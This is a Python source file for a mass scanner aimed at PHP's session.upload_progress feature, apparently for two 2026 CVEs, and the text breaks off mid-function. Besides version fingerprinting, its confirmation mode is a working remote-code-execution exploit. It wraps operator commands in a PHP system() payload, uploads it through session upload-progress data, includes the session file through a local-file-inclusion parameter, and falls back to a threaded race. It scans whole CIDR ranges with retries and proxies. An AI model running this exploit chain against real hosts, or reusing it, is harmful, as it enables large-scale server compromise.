#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — production fleet scanner.

DETECTION (always): multi-source PHP fingerprint + version policy.
CONFIRMATION (--confirm): prove RCE by running command(s) via
session.upload_progress + LFI (single-request, then race fallback).

Design notes
------------
* Scheme inference: a bare host becomes https:// ; an explicit :80 becomes
  http:// .  --auto-scheme additionally retries over HTTP if TLS fails.
* Bounded-memory pipeline (producer/consumer) — safe for millions of targets.
* Streaming outputs + atomic finalisation + --resume.
* Live dashboard with per-host phase; auto-degrades when piped.
* Every boundary (DNS, socket, TLS, HTTP, disk, threads) is exception-guarded.

Exit codes: 0 ok · 1 --fail-on hit · 2 usage · 3 scope/IO · 130 interrupted.

Examples
--------
  detect_upload_progress.py --selftest
  detect_upload_progress.py --scope hosts.txt --authorized --out run1
  detect_upload_progress.py --scope 10.0.0.0/16 --authorized --confirm \
      --lfi-path /index.php --lfi-param file --workers 200
"""
import argparse
import base64
import csv
import http.client
import http.server
import ipaddress
import json
import os
import queue
import random
import re
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from collections import Counter, deque
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, quote, parse_qsl

__version__ = "2.0"

UA = f"upload-progress-detector/{__version__} (authorized-scan)"

DEFAULT_FIXED_MIN = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}
FEATURE_INTRODUCED = (5, 4, 0)
DEFAULT_SESSION_DIRS = "/tmp,/var/lib/php/sessions,/var/lib/php5,/var/lib/php/session"

PHP_VER_RE = re.compile(rb"PHP[/\s]?(\d+)\.(\d+)(?:\.(\d+))?", re.IGNORECASE)
REDIRECT_CODES = {301, 302, 303, 307, 308}

STOP = threading.Event()
VERBOSITY = 0
_COLOR = False
_DASH = None
_LOG_FILE = None
_EMIT_LOCK = threading.Lock()

_C = {"reset": "\x1b[0m", "red": "\x1b[31m", "grn": "\x1b[32m",
      "yel": "\x1b[33m", "blu": "\x1b[36m", "dim": "\x1b[2m", "bold": "\x1b[1m"}


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------
def col(text, name):
    if not _COLOR:
        return text
    return f"{_C.get(name, '')}{text}{_C['reset']}"


def emit(text):
    with _EMIT_LOCK:
        if _LOG_FILE is not None:
            try:
                _LOG_FILE.write(text + "\n")
                _LOG_FILE.flush()
            except OSError:
                pass
    if _DASH is not None:
        _DASH.msg(text)
    else:
        with _EMIT_LOCK:
            try:
                print(text, flush=True)
            except OSError:
                pass


def debug(text):
    if VERBOSITY >= 2:
        emit(text)


def warn(text):
    with _EMIT_LOCK:
        if _LOG_FILE is not None:
            try:
                _LOG_FILE.write(text + "\n")
            except OSError:
                pass
        if _DASH is None:
            try:
                print(col(text, "red"), file=sys.stderr, flush=True)
            except OSError:
                pass


def _hms(sec):
    sec = max(0, int(sec))
    h, rem = divmod(sec, 3600)
    m, s = divmod(rem, 60)
    return f"{h:d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"


def _thread_excepthook(args):
    if args.exc_type is SystemExit:
        return
    warn(f"[!] thread {args.thread.name if args.thread else '?'} crashed: "
         f"{args.exc_type.__name__}: {args.exc_value}")
    if VERBOSITY >= 2 and args.exc_traceback:
        traceback.print_exception(args.exc_type, args.exc_value, args.exc_traceback)


# ---------------------------------------------------------------------------
# DNS cache
# ---------------------------------------------------------------------------
_dns_cache = {}
_dns_lock = threading.Lock()


def resolve_addrs(host, port, family):
    key = (host, port, family)
    with _dns_lock:
        hit = _dns_cache.get(key)
    if hit is not None:
        return hit
    infos = socket.getaddrinfo(host, port, family, socket.SOCK_STREAM)
    addrs = [(af, st, proto, sa) for af, st, proto, _c, sa in infos]
    with _dns_lock:
        _dns_cache[key] = addrs
    return addrs


def _open_socket(host, port, timeout, family):
    last = None
    for af, st, proto, sa in resolve_addrs(host, port, family):
        s = None
        try:
            s = socket.socket(af, st, proto)
            s.settimeout(timeout)
            s.connect(sa)
            return s
        except OSError as e:
            last = e
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    raise last or OSError(f"cannot connect to {host}:{port}")


# ---------------------------------------------------------------------------
# Result
# ---------------------------------------------------------------------------
@dataclass
class Result:
    target: str = ""
    host: str = ""
    port: int = 0
    scheme: str = ""
    status: str = "error"
    php_version: str = ""
    ver_source: str = ""
    detail: str = ""
    http_status: str = ""
    final_url: str = ""
    elapsed_ms: int = 0
    probe_status: str = ""
    probe_sets_phpsessid: str = ""
    confirm_status: str = ""
    confirm_output: str = ""
    confirm_sid: str = ""
    confirm_strategy: str = ""
    confirm_dir: str = ""
    error: str = ""

    @property
    def is_finding(self):
        return self.status == "affected"


# ---------------------------------------------------------------------------
# Version policy
# ---------------------------------------------------------------------------
def classify_version(ver, fixed_min):
    if ver is None:
        return "unknown", "no PHP version fingerprint"
    major, minor, _patch = ver
    vs = ".".join(map(str, ver))
    if ver < FEATURE_INTRODUCED:
        return "not_affected", f"{vs}: predates session.upload_progress"
    branch = (major, minor)
    if branch in fixed_min:
        fixed = fixed_min[branch]
        if ver >= fixed:
            return "fixed", f"{vs}: on or above patched {'.'.join(map(str, fixed))}"
        return "affected", f"{vs}: below patched {'.'.join(map(str, fixed))}"
    if (major, minor) > (8, 5):
        return "unknown", f"{vs}: newer than advisory, verify manually"
    return "affected", f"{vs}: EOL branch, no official fix"


def parse_fixed_min(items):
    fixed = dict(DEFAULT_FIXED_MIN)
    for it in items or []:
        m = re.fullmatch(r"(\d+)\.(\d+)(?:\.(\d+))?", str(it).strip())
        if not m:
            warn(f"[!] ignoring malformed --fixed-min {it!r}")
            continue
        maj, mnr, pat = m.groups()
        fixed[(int(maj), int(mnr))] = (int(maj), int(mnr), int(pat or 0))
    return fixed


# ---------------------------------------------------------------------------
# Rate limiting
# ---------------------------------------------------------------------------
class TokenBucket:
    def __init__(self, rate, burst=None, jitter=0.0):
        self.rate = float(rate)
        self.capacity = burst if burst else max(1.0, self.rate)
        self.jitter = jitter
        self._tokens = self.capacity
        self._ts = time.monotonic()
        self._lock = threading.Lock()

    def acquire(self):
        if self.rate <= 0:
            return
        while True:
            with self._lock:
                now = time.monotonic()
                self._tokens = min(self.capacity, self._tokens + (now - self._ts) * self.rate)
                self._ts = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    need = 0.0
                    break
                need = (1.0 - self._tokens) / self.rate
            try:
                time.sleep(min(need, 0.25))
            except (OSError, ValueError):
                return
        if self.jitter:
            time.sleep(random.uniform(0, self.jitter))


class HostLimiter:
    def __init__(self, rate, jitter):
        self.rate = rate
        self.jitter = jitter
        self._buckets = {}
        self._lock = threading.Lock()

    def acquire(self, host):
        if self.rate <= 0:
            return
        with self._lock:
            b = self._buckets.get(host)
            if b is None:
                b = self._buckets[host] = TokenBucket(self.rate, jitter=self.jitter)
        b.acquire()


# ---------------------------------------------------------------------------
# Scope parsing
# ---------------------------------------------------------------------------
_CIDR_RE = re.compile(r"^\d+\.\d+\.\d+\.\d+/\d{1,2}$")
_RANGE_RE = re.compile(r"^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$")


def _bracket(host):
    return f"[{host}]" if ":" in host and not host.startswith("[") else host


def infer_scheme(explicit, port, default_scheme):
    """https by default; http when the host is explicitly on :80."""
    if explicit:
        return explicit
    if port == 80:
        return "http"
    if port == 443:
        return "https"
    return default_scheme


def _target(scheme, host, port, path, resolve_map=None, inferred=False):
    default_port = 443 if scheme == "https" else 80
    port = port or default_port
    t = {"scheme": scheme, "host": host, "port": port, "path": path,
         "display": f"{scheme}://{_bracket(host)}:{port}{path}",
         "connect_host": None, "sni": None, "host_header": None,
         "inferred": inferred, "lfi_path": path}
    if resolve_map and host in resolve_map:
        t["connect_host"] = resolve_map[host]
        t["sni"] = host
    return t


def normalize_target(raw, default_scheme, resolve_map=None):
    try:
        raw = raw.strip()
        if not raw or raw.startswith("#"):
            return None
        explicit = None
        if "://" in raw:
            u = urlparse(raw)
            explicit = u.scheme if u.scheme in ("http", "https") else None
        else:
            u = urlparse(f"//{raw}")
        if not u.hostname:
            return None
        scheme = infer_scheme(explicit, u.port, default_scheme)
        return _target(scheme, u.hostname, u.port, u.path or "/", resolve_map,
                       inferred=explicit is None)
    except ValueError:
        return None


def _iter_hosts(spec, cap):
    if _CIDR_RE.match(spec):
        try:
            net = ipaddress.ip_network(spec, strict=False)
        except ValueError:
            return [spec]
        seq = net.hosts() if net.num_addresses > 2 else net
        out = []
        for ip in seq:
            out.append(str(ip))
            if len(out) >= cap:
                break
        return out
    if _RANGE_RE.match(spec):
        a_s, b_s = spec.split("-")
        try:
            a = int(ipaddress.ip_address(a_s))
            b = int(ipaddress.ip_address(b_s))
        except ValueError:
            return [spec]
        if b < a:
            return [spec]
        return [str(ipaddress.ip_address(n)) for n in range(a, min(b, a + cap - 1) + 1)]
    return [spec]


def _split_hostport(core):
    if core.startswith("["):
        host, _, rest = core.partition("]")
        host = host[1:]
        port = int(rest[1:]) if rest.startswith(":") and rest[1:].isdigit() else None
        return host, port
    if _CIDR_RE.match(core) or _RANGE_RE.match(core):
        return core, None
    host, _, p = core.partition(":")
    return host, int(p) if p.isdigit() else None


def parse_scope(lines, default_scheme, resolve_map, cap, exclude=None, include=None):
    seen, targets = set(), []
    try:
        ex = re.compile(exclude) if exclude else None
    except re.error as e:
        warn(f"[!] bad --exclude regex: {e}")
        ex = None
    try:
        inc = re.compile(include) if include else None
    except re.error as e:
        warn(f"[!] bad --include regex: {e}")
        inc = None

    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for chunk in line.replace(",", " ").split():
            chunk = chunk.strip()
            if not chunk or chunk.startswith("#"):
                continue
            try:
                explicit, path, port = None, "/", None
                if "://" in chunk:
                    u = urlparse(chunk)
                    if not u.hostname:
                        continue
                    explicit = u.scheme if u.scheme in ("http", "https") else None
                    core = _bracket(u.hostname) + (f":{u.port}" if u.port else "")
                    path = u.path or "/"
                else:
                    core = chunk
                    if not (_CIDR_RE.match(core) or _RANGE_RE.match(core)) and "/" in core:
                        core, _, p = core.partition("/")
                        path = "/" + p
                hostpart, port = _split_hostport(core)
                scheme = infer_scheme(explicit, port, default_scheme)
                for host in _iter_hosts(hostpart, cap):
                    if ex and ex.search(host):
                        continue
                    if inc and not inc.search(host):
                        continue
                    t = _target(scheme, host, port, path, resolve_map,
                                inferred=explicit is None)
                    if t["display"] not in seen:
                        seen.add(t["display"])
                        targets.append(t)
                        if len(targets) >= cap:
                            return targets
            except (ValueError, TypeError) as e:
                warn(f"[!] skipping malformed scope entry {chunk!r}: {e}")
    return targets


def host_header(t):
    if t.get("host_header"):
        return t["host_header"]
    h = _bracket(t["host"])
    default_port = 443 if t["scheme"] == "https" else 80
    return h if t["port"] == default_port else f"{h}:{t['port']}"


def lfi_url(t, param, directory, sid):
    path = t.get("lfi_path") or t["path"]
    sep = "&" if "?" in path else "?"
    return f"{path}{sep}{param}={quote(f'{directory}/sess_{sid}')}"


# ---------------------------------------------------------------------------
# Proxy
# ---------------------------------------------------------------------------
class Proxy:
    def __init__(self, url):
        u = urlparse(url if "://" in url else f"http://{url}")
        if not u.hostname:
            raise ValueError(f"bad proxy URL: {url!r}")
        self.scheme = u.scheme if u.scheme in ("http", "https") else "http"
        self.host = u.hostname
        self.port = u.port or (443 if self.scheme == "https" else 80)
        self.auth = None
        if u.username:
            raw = f"{u.username}:{u.password or ''}".encode("latin-1")
            self.auth = "Basic " + base64.b64encode(raw).decode("ascii")

    def __repr__(self):
        return f"{self.scheme}://{self.host}:{self.port}"


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------
class Response:
    __slots__ = ("status", "headers", "body", "url", "redirects", "reusable")

    def __init__(self, status, headers, body, url, redirects=0, reusable=False):
        self.status, self.headers, self.body = status, headers, body
        self.url, self.redirects, self.reusable = url, redirects, reusable


class _Base:
    """Mixin giving both conn classes a stable, keyword-only-safe ctor."""

    def _setup(self, host, port, timeout, sni, family):
        self._connect_host = host
        self.sni = sni
        self.family = family

    def connect(self):
        host = self._connect_host or self.host
        sock = _open_socket(host, self.port, self.timeout, self.family)
        if self._tunnel_host:
            self.sock = sock
            self._tunnel()
            sock = self.sock
        if isinstance(self, http.client.HTTPSConnection):
            self.sock = self._context.wrap_socket(sock, server_hostname=self.sni or self.host)
        else:
            self.sock = sock


class _HTTPConn(_Base, http.client.HTTPConnection):
    def __init__(self, host, port=None, timeout=None, context=None, sni=None, family=0):
        kw = {}
        if timeout is not None:
            kw["timeout"] = timeout
        http.client.HTTPConnection.__init__(self, host, port, **kw)
        self._setup(host, port, timeout, sni, family)


class _HTTPSConn(_Base, http.client.HTTPSConnection):
    def __init__(self, host, port=None, timeout=None, context=None, sni=None, family=0):
        kw = {}
        if timeout is not None:
            kw["timeout"] = timeout
        if context is not None:
            kw["context"] = context
        http.client.HTTPSConnection.__init__(self, host, port, **kw)
        self._setup(host, port, timeout, sni, family)


class Transport:
    def __init__(self, timeout=8.0, retries=2, backoff=0.4, max_redirects=5,
                 max_body=32768, tls_legacy=False, family=0, extra_headers=None,
                 jitter=0.0, keepalive=False, resolve_map=None, default_scheme="https",
                 verify_tls=False, ca_bundle=None, proxy=None, user_agent=UA):
        self.timeout = timeout
        self.retries = max(0, retries)
        self.backoff = max(0.0, backoff)
        self.max_redirects = max(0, max_redirects)
        self.max_body = max_body
        self.tls_legacy = tls_legacy
        self.family = family
        self.extra_headers = dict(extra_headers or {})
        self.extra_headers["User-Agent"] = user_agent
        self.jitter = jitter
        self.keepalive = keepalive
        self.resolve_map = resolve_map or {}
        self.default_scheme = default_scheme
        self.verify_tls = verify_tls
        self.ca_bundle = ca_bundle
        self.proxy = proxy
        self._ctx_modern = self._ctx(False)
        self._ctx_legacy = self._ctx(True)
        self._pool = {}
        self._pool_lock = threading.Lock()

    def _ctx(self, legacy):
        try:
            if self.verify_tls:
                ctx = ssl.create_default_context(cafile=self.ca_bundle)
                ctx.check_hostname = True
            else:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
        except (ssl.SSLError, OSError, ValueError):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        if legacy:
            try:
                ctx.minimum_version = ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            try:
                ctx.set_ciphers("DEFAULT@SECLEVEL=1")
            except ssl.SSLError:
                pass
        return ctx

    def _key(self, t):
        return (t["scheme"], t.get("connect_host") or t["host"], t["port"], t.get("sni"))

    def _new_conn(self, t, legacy):
        target_host = t.get("connect_host") or t["host"]
        ctx = self._ctx_legacy if legacy else self._ctx_modern
        if self.proxy:
            cls = _HTTPSConn if self.proxy.scheme == "https" else _HTTPConn
            conn = cls(self.proxy.host, self.proxy.port, timeout=self.timeout,
                       context=ctx, sni=None, family=self.family)
            if t["scheme"] == "https":
                conn.set_tunnel(target_host, t["port"])
                conn.sni = t.get("sni") or target_host
            return conn
        if t["scheme"] == "https":
            return _HTTPSConn(target_host, t["port"], timeout=self.timeout,
                              context=ctx, sni=t.get("sni"), family=self.family)
        return _HTTPConn(target_host, t["port"], timeout=self.timeout, family=self.family)

    def _checkout(self, t, legacy):
        if not self.keepalive or self.proxy:
            return self._new_conn(t, legacy), False
        key = self._key(t)
        with self._pool_lock:
            bucket = self._pool.get(key)
            if bucket:
                return bucket.pop(), True
        return self._new_conn(t, legacy), False

    def _checkin(self, t, conn):
        if not self.keepalive or self.proxy:
            try:
                conn.close()
            except OSError:
                pass
            return
        key = self._key(t)
        with self._pool_lock:
            bucket = self._pool.setdefault(key, [])
            if len(bucket) < 2:
                bucket.append(conn)
                return
        try:
            conn.close()
        except OSError:
            pass

    def close(self):
        with self._pool_lock:
            for bucket in self._pool.values():
                for c in bucket:
                    try:
                        c.close()
                    except OSError:
                        pass
            self._pool.clear()

    def _backoff(self, attempt):
        delay = self.backoff * (2 ** (attempt - 1))
        if self.jitter:
            delay += random.uniform(0, self.backoff)
        if delay > 0:
            try:
                time.sleep(delay)
            except (OSError, ValueError):
                pass

    def _once(self, t, method, path, headers, body, max_body, legacy):
        conn, reused = self._checkout(t, legacy)
        started = time.monotonic()
        try:
            hdrs = {"Accept": "*/*", "Accept-Encoding": "identity"}
            if not self.keepalive:
                hdrs["Connection"] = "close"
            hdrs.update(self.extra_headers)
            hdrs["Host"] = host_header(t)
            if self.proxy and self.proxy.auth:
                hdrs.setdefault("Proxy-Authorization", self.proxy.auth)
            hdrs.update(headers or {})
            if body is None:
                hdrs.pop("Content-Length", None)
            req_path = path
            if self.proxy and t["scheme"] == "http" and not path.startswith("http"):
                req_path = f"http://{host_header(t)}{path}"
            conn.request(method, req_path, body=body, headers=hdrs)
            resp = conn.getresponse()
            hdrs_out = {k.lower(): v for k, v in resp.getheaders()}
            cap = max_body or self.max_body
            data = resp.read(cap)
            reusable = not resp.will_close
            if self.keepalive and reusable and not self.proxy:
                try:
                    data += resp.read()
                except (http.client.HTTPException, OSError):
                    reusable = False
            debug(f"    .. {method} {t['display']}"
                  f"{'' if path == t['path'] else path} -> {resp.status} "
                  f"{len(data)}b {(time.monotonic()-started)*1000:.0f}ms"
                  f"{' [reused]' if reused else ''}")
            if reusable:
                self._checkin(t, conn)
            else:
                try:
                    conn.close()
                except OSError:
                    pass
            return Response(resp.status, hdrs_out, data, t["display"], reusable=reusable)
        except BaseException:
            try:
                conn.close()
            except (OSError, http.client.HTTPException):
                pass
            raise

    def _send(self, t, method, path, headers, body, max_body):
        attempt, legacy = 0, self.tls_legacy
        while True:
            try:
                return self._once(t, method, path, headers, body, max_body, legacy)
            except ssl.SSLError:
                if not legacy:
                    legacy = True
                    continue
                if attempt < self.retries:
                    attempt += 1
                    self._backoff(attempt)
                    continue
                raise
            except (socket.timeout, TimeoutError, ConnectionError,
                    http.client.HTTPException, OSError) as e:
                if attempt < self.retries:
                    attempt += 1
                    self._backoff(attempt)
                    continue
                raise e

    def request(self, t, method, path, headers=None, body=None,
                max_body=None, allow_redirects=True):
        resp = self._send(t, method, path, headers, body, max_body)
        redirects = 0
        while (allow_redirects and resp.status in REDIRECT_CODES
               and "location" in resp.headers and redirects < self.max_redirects):
            loc = resp.headers["location"]
            base = resp.url if "://" in resp.url else f"{t['scheme']}://{host_header(t)}{path}"
            try:
                nt = normalize_target(urljoin(base, loc), self.default_scheme,
                                      self.resolve_map)
            except (ValueError, TypeError):
                break
            if not nt:
                break
            redirects += 1
            if resp.status in (301, 302, 303) and method == "POST":
                method, body = "GET", None
            nt["host_header"] = t.get("host_header")
            try:
                nxt = self._send(nt, method, nt["path"], headers, body, max_body)
            except Exception as e:
                debug(f"    !! redirect hop failed for {t['display']}: {e!r}")
                break
            resp = nxt
            resp.redirects = redirects
        return resp


# ---------------------------------------------------------------------------
# Fingerprinting
# ---------------------------------------------------------------------------
def fingerprint(resp):
    sources = []
    for h in ("server", "x-powered-by", "x-php-version", "x-backend-server",
              "x-generator", "via"):
        if h in resp.headers:
            sources.append((h, resp.headers[h]))
    if resp.body:
        try:
            sources.append(("body", resp.body[:8192].decode("latin-1", "replace")))
        except (UnicodeError, AttributeError):
            pass
    best, best_src = None, ""
    for label, text in sources:
        for m in PHP_VER_RE.finditer(text.encode("latin-1", "replace")):
            try:
                ver = tuple(int(x) for x in m.groups() if x is not None)
            except ValueError:
                continue
            if len(ver) == 2:
                ver = (ver[0], ver[1], 0)
            if best is None or ver > best:
                best, best_src = ver, label
    return best, best_src


# ---------------------------------------------------------------------------
# Benign probe
# ---------------------------------------------------------------------------
def benign_probe(t, transport, limiter):
    boundary = "benignprobe"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="probe.txt"\r\n\r\nPROBE\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    limiter.acquire()
    resp = transport.request(t, "POST", t["path"], headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
    }, body=body, max_body=512, allow_redirects=False)
    return resp.status, ("PHPSESSID" in resp.headers.get("set-cookie", ""))


# ---------------------------------------------------------------------------
# Confirmation
# ---------------------------------------------------------------------------
def build_payload(cmds):
    marker = "___W5b___"
    payload = " && ".join(cmds).replace("'", "'\\''")
    return f"<?php echo '{marker}'; system('{payload}'); echo '{marker}'; ?>", marker


def _multipart(boundary, php):
    pre = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprobe\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{php}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("latin-1")
    return pre, f"\r\n--{boundary}--\r\n".encode("latin-1")


def _inspect(html, marker):
    if "<?php" in html:
        return "no_exec", html
    parts = html.split(marker)
    if len(parts) >= 3:
        return "ok", parts[1]
    return None, ""


def _confirm_single(t, transport, php, marker, sid, cookie, param, directory, limiter):
    boundary = "whoamiprobe"
    pre, tail = _multipart(boundary, php)
    body = pre + b"A" * 4096 + tail
    limiter.acquire()
    try:
        resp = transport.request(t, "POST", lfi_url(t, param, directory, sid), headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
            "Cookie": cookie,
        }, body=body, max_body=262144, allow_redirects=False)
    except Exception as e:
        debug(f"    !! confirm-single {t['display']}: {e!r}")
        return None, ""
    return _inspect(resp.body.decode("latin-1", "replace"), marker)


def _confirm_race(t, transport, php, marker, sid, cookie, param, dirs,
                  pad_kb, delay, pollers, limiter, timeout):
    boundary = "whoamiprobe"
    chunk = 32 * 1024
    n = max(1, (pad_kb * 1024) // chunk)
    pre, tail = _multipart(boundary, php)
    chunks = [pre] + [b"A" * chunk] * n + [tail]
    total = sum(len(c) for c in chunks)
    headers = {
        "Host": host_header(t), "User-Agent": UA,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(total), "Cookie": cookie, "Connection": "close",
    }
    state = {"done": False, "err": ""}
    found = {"status": None, "out": "", "dir": ""}
    stop = threading.Event()
    flk = threading.Lock()

    def _upload():
        conn = None
        try:
            conn = transport._new_conn(t, transport.tls_legacy)
            conn.putrequest("POST", t["path"], skip_host=True, skip_accept_encoding=True)
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            for c in chunks:
                conn.send(c)
                if delay:
                    time.sleep(delay)
            conn.getresponse().read(262144)
        except Exception as e:
            state["err"] = repr(e)
        finally:
            state["done"] = True
            if conn is not None:
                try:
                    conn.close()
                except (OSError, http.client.HTTPException):
                    pass

    def _poller():
        while not stop.is_set():
            for d in dirs:
                if stop.is_set():
                    return
                try:
                    limiter.acquire()
                    resp = transport.request(t, "GET", lfi_url(t, param, d, sid),
                                             headers={"Cookie": cookie},
                                             max_body=262144, allow_redirects=False)
                except Exception:
                    continue
                status, out = _inspect(resp.body.decode("latin-1", "replace"), marker)
                if status:
                    with flk:
                        found.update(status=status, out=out, dir=d)
                    if status == "ok":
                        stop.set()
                        return

    up = threading.Thread(target=_upload, daemon=True, name="confirm-upload")
    up.start()
    pts = [threading.Thread(target=_poller, daemon=True, name=f"confirm-poll{i}")
           for i in range(max(1, pollers))]
    for p in pts:
        p.start()

    deadline = time.monotonic() + timeout * 3
    grace = None
    while time.monotonic() < deadline:
        if found["status"] == "ok":
            break
        if state["done"]:
            grace = grace or time.monotonic()
            if time.monotonic() - grace > min(3.0, timeout):
                break
        time.sleep(0.05)
    stop.set()
    up.join(timeout=1.0)
    for p in pts:
        p.join(timeout=1.0)
    return (found["status"] or "miss"), found["out"], found["dir"]


def confirm_rce(t, transport, cmds, param, dirs, pad_kb, delay, pollers, limiter, timeout):
    php, marker = build_payload(cmds)
    sid = os.urandom(13).hex()
    cookie = f"PHPSESSID={sid}"
    endpoints = [t.get("lfi_path") or t["path"]]
    if t["path"] not in endpoints:
        endpoints.append(t["path"])
    orig = t.get("lfi_path")
    try:
        for ep in endpoints:
            t["lfi_path"] = ep
            for d in dirs:
                status, out = _confirm_single(t, transport, php, marker, sid,
                                              cookie, param, d, limiter)
                if status == "ok":
                    return "ok", out.strip(), sid, "single", d
                if status == "no_exec":
                    return "no_exec", out.strip(), sid, "single", d
        t["lfi_path"] = orig
        status, out, d = _confirm_race(t, transport, php, marker, sid, cookie,
                                       param, dirs, pad_kb, delay, pollers,
                                       limiter, timeout)
        return status, out.strip(), sid, "race", d
    finally:
        t["lfi_path"] = orig


# ---------------------------------------------------------------------------
# Dashboard
# ---------------------------------------------------------------------------
class Dashboard:
    def __init__(self, total, interval=0.5, tty=True, max_lines=8):
        self.total = total
        self.interval = interval
        self.tty = tty and sys.stdout.isatty()
        self.max_lines = max_lines
        self.lock = threading.RLock()
        self.msgs = deque()
        self.inflight = {}
        self.done = 0
        self.counts = Counter()
        self.confirmed = 0
        self.t0 = time.monotonic()          # NOT self.start: that name is the method
        self._drawn = 0
        self._stop = threading.Event()
        self._th = None
        self._last_plain = 0.0

    def start(self):
        if self.tty:
            self._th = threading.Thread(target=self._loop, daemon=True, name="dashboard")
            self._th.start()

    def stop(self):
        self._stop.set()
        if self._th:
            self._th.join(timeout=2)
        if self.tty:
            self._clear()
        with self.lock:
            msgs, self.msgs = list(self.msgs), deque()
        for m in msgs:
            try:
                print(m, flush=True)
            except OSError:
                pass

    def msg(self, text):
        if not self.tty:
            with _EMIT_LOCK:
                try:
                    print(text, flush=True)
                except OSError:
                    pass
            return
        with self.lock:
            self.msgs.append(text)

    def phase(self, display, phase):
        with self.lock:
            self.inflight[display] = phase

    def unphase(self, display):
        with self.lock:
            self.inflight.pop(display, None)

    def complete(self, status, confirmed=False):
        with self.lock:
            self.done += 1
            self.counts[status] += 1
            if confirmed:
                self.confirmed += 1

    def _loop(self):
        while not self._stop.wait(self.interval):
            try:
                self._tick()
            except OSError:
                pass

    def _clear(self):
        if not self._drawn:
            return
        out = [f"\x1b[{self._drawn}A"]
        for _ in range(self._drawn):
            out.append("\x1b[2K\n")
        out.append(f"\x1b[{self._drawn}A")
        sys.stdout.write("".join(out))
        sys.stdout.flush()
        self._drawn = 0

    def _draw(self, lines):
        out = []
        for ln in lines:
            out.append("\x1b[2K" + ln + "\n")
        sys.stdout.write("".join(out))
        sys.stdout.flush()
        self._drawn = len(lines)

    def _compose(self):
        with self.lock:
            done, total = self.done, self.total
            inflight = sorted(self.inflight.items())
            counts = Counter(self.counts)
            confirmed = self.confirmed
        elapsed = max(1e-6, time.monotonic() - self.t0)
        rate = done / elapsed
        frac = done / total if total else 1.0
        width = 28
        filled = int(width * min(1.0, frac))
        bar = "#" * filled + "-" * (width - filled)
        eta = (total - done) / rate if rate > 0 else 0
        lines = [
            col(f"[{bar}] {frac*100:5.1f}%  {done}/{total}  {rate:6.0f}/s  "
                f"eta {_hms(eta)}  inflight {len(inflight)}  "
                f"affected {counts.get('affected', 0)}  rce {confirmed}  "
                f"err {counts.get('error', 0)}", "bold")
        ]
        for disp, phase in inflight[:self.max_lines]:
            lines.append(f"   {col('>', 'blu')} {disp:<52} {phase}")
        extra = len(inflight) - self.max_lines
        if extra > 0:
            lines.append(f"   ... +{extra} more in flight")
        return lines

    def _tick(self):
        with self.lock:
            msgs, self.msgs = list(self.msgs), deque()
        self._clear()
        for m in msgs:
            sys.stdout.write(m + "\n")
        self._draw(self._compose())
        sys.stdout.flush()

    def plain_tick(self):
        if self.tty:
            return
        now = time.monotonic()
        if now - self._last_plain < self.interval * 10:
            return
        self._last_plain = now
        with self.lock:
            done, total = self.done, self.total
        elapsed = max(1e-6, now - self.t0)
        pct = done / total * 100 if total else 0.0
        eta = (total - done) / (done / elapsed) if done else 0
        emit(col(f"[*] progress {done}/{total} ({pct:.1f}%) {done/elapsed:.0f}/s "
                 f"eta {_hms(eta)}", "dim"))


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
COLS = ["target", "host", "port", "scheme", "status", "php_version", "ver_source",
        "detail", "http_status", "final_url", "elapsed_ms", "probe_status",
        "probe_sets_phpsessid", "confirm_status", "confirm_output", "confirm_sid",
        "confirm_strategy", "confirm_dir", "error"]


class Sink:
    """Streaming JSONL + CSV + findings report, all crash-safe."""

    def __init__(self, base, resume):
        self.base = base
        self.jsonl_path = f"{base}.jsonl"
        self.csv_path = f"{base}.csv"
        self.json_path = f"{base}.json"
        self.findings_path = f"{base}.findings.txt"
        self.lock = threading.Lock()
        self.count = 0

        self._jsonl = open(self.jsonl_path, "a" if resume else "w", encoding="utf-8")

        self._csv_tmp = f"{self.csv_path}.tmp.{os.getpid()}"
        have_rows = (resume and os.path.exists(self.csv_path)
                     and os.path.getsize(self.csv_path) > 0)
        if have_rows:
            shutil.copyfile(self.csv_path, self._csv_tmp)
            self._csv = open(self._csv_tmp, "a", newline="", encoding="utf-8")
        else:
            self._csv = open(self._csv_tmp, "w", newline="", encoding="utf-8")
        self._writer = csv.DictWriter(self._csv, fieldnames=COLS)
        if not have_rows:
            self._writer.writeheader()

        self._find_tmp = f"{self.findings_path}.tmp.{os.getpid()}"
        mode = "a" if (resume and os.path.exists(self.findings_path)) else "w"
        self._findings = open(self._find_tmp, mode, encoding="utf-8")

    def resume_keys(self):
        keys = set()
        if os.path.exists(self.jsonl_path):
            try:
                with open(self.jsonl_path, "r", encoding="utf-8") as fh:
